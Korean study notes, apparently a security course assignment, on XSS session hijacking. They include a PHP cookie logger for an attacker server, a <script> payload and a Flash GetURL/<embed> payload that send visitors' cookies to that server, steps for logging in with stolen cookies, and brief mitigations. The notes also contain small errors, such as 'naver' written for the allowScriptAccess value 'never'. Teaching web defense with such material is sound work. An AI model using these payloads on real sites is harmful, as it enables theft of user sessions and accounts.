[과제]_쿠키 변조 (cookie tampering)

XXS(cross site scripting)

#설명#
- 스크립트를 삽입하여 웹 에플리케이션에서 순수하게 제공되는 동작 외에 부정적으로 일어나는 패턴.
- 다른 해킹 기법과의 큰 차이점은 공격의 대상이 Client 라는 점.

#피해#
- 웜, 바이러스 배포
- 세션 하이재킹 공격 (가장 많이 하는 공격)
- SCRF 공격
- 피싱 공격

#원인#
- <html> 태그를 사용 가능하게 되면서, <script> 태그로 공격이 가능하기 때문이다.

#공격방식#

1) 세션 하이재킹 <script> 스크립트 이용

* 순서
- / 상용 서버에 게시글 작성 /->/ 게시글 작성 내용은 <script> 태그를 이용한 공격 코드로 작성 /->/ 게시물을 읽은 사용자의 쿠키를 공격자 서버로 전송 /->/ 전송된 쿠키를 이용하여 쿠키 변조로 서버에 로그인 /

* 실습
1. <script> 태그가 동작하는지 테스트해본다.
2. 동작이 되면 취약한 웹 서버 이므로 타깃으로 정한다.
3. 해커(공격자) 컴퓨터에 서버 구축.

[CODE]

<? 
$cookie=$_GET['data'];  //data 값을 가지고 온다.

$atime=date("y-m-d H:i:s"); //년 월 일 시 분 초

$log=fopen("data.txt","a");  //파일 생성 a는 띄어쓰기 옵션

fwrite($log,$atime." ".$cookie."\r\n"); //파일을 쓴다. \r\n은 개행

fclose($log); //파일 닫기

echo "<img src=http://192.168.126.129/gogo.png width=220 height=150></img>"; 
//해커의 웹서버 주소  팝업창 크기
?>

[/CODE]

4. XSS공격을 시도한다.(<script> 스크립트를 사용해 게시판에 글 작성 )

[CODE]

<script>
window.open("http://[해커 서버]/cookie.php?data="+document.cookie,
//document.cookie 쿠기값 읽어서 data로 넘겨준다.

"small","width=150,height=220,scrollbars=no,menubar=no") //부가적인 옵션
</script> 

[/CODE]

5. 로그인된 사용자가 해당 게시글을 읽게 되면 해커 서버로 연결이된다.
6. 그러면 해커의 컴퓨터에 cookie.php가 동작하여 파일이 생성된다.
7. 그 파일 안에 쿠키 값이 들어오게 된다.
8. 그 쿠키를 "쿠키 변조 프로그램" 으로 변경한 후 새로 고침 하면 쿠키 변조로 로그인된 사용자의 계정이 되어서 그 계정을 사용가능 하게 된다.


2) 세션 하이재킹 (Flash Action Script) --- Flash 내부 Actionscript 함수 GetURL() 을 이용한 방법

*순서
- / Flash로 GetURL 함수에 쿠키 값을 얻어오는 코드를 포함한 플래시 파일을 만든다 /->/ 해커(공격자)의 서버에 플래시 파일을 저장 /->/ 공격할 사이트의 게시글에 플래시 글을 태그로 추가 <embed> /->/ 이용자가 글을 읽는 순간 태그가 발동해 플래시 파일이 구동됨 /->/ 그 플래시 파일에서 함수가 작동돼 쿠키가 해커(공격자) 에게로 전송됨. /

*실습
1. 이미지를 올리고 GetURL 함수를 이용한다.
2. 쿠키 값을 data로 넘겨주는 코드를 포함한 플래시 파일(*.swf)를 만든다.

[CODE]

"javascript:document.location='http://[공격자 서버 ip]/cookie.php?data='+document.cookie"

[/CODE]

3. 공격할 서버 개시판에 아래 처럼 태그를 연결한다.

[CODE]

<embed src="http://[공격자 서버 ip]/xss.swf" allowScriptAccess="always"></embed>

[/CODE]

4. 서버 사용자가 게시글을 읽는다.
5. 플래시 파일이 재생되면서 바로 GetURL 함수가 호출된다.
6. 공격자의 서버에는 게시글을 읽은 사람의 쿠키값이 넘어온다.
7. 쿠키 변조 툴을 이용해 변조한다.
8. 변조후 새로 고침 하면 사용자의 로그인 정보를 가져온다.

#보안/방지#
1. HTML 지원 X
- html 을 인코딩 하게 해서 문자로 나오게 한다.
  ex. / 
contents = UploadForm("content")
contents = server.htmlencode(contents) 
/

2. HTML을 화이트 리스트 방식 허용 --- (*화이트 리스트는 일부 태그만 허용.)
- 앞의 문자를 뒤의 태그로 대체한다. --- (대체한 태그는 동작이된다.)

3. 사용자는 팝업 차단 설정


#기타#

* allowScriptAccess 옵션은 3가지 옵션이 있으며 자바 스크립트 연계에 대한 여부를 결정한다.
  allowScriptAccess="samedomain" - 같은 사이트 내에서만 연계 허용
  allowScriptAccess="always" - 사이트가 달라도 연계 허용
  allowScriptAccess="naver" - 절대로 연계 x

* XSS 공격의 영향은 해당 사이트의 관리자의 쿠키가 넘어왔다면, 큰 파장이 일어 날 수 있으며
  이용자의 개인 정보 유출 등 2차 피해가 일어 날 수 있다.